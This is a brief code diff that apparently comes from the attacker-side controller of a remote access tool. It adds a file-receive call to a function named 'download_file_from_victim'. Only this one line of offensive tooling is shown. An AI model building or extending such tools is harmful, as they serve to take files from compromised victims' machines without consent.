@@ -21,3 +21,5 @@ def upload_files(my_socket):
 
 def download_file_from_victim(my_socket):
     print("[+] Downloading File")
+    my_socket.receive_file()
+
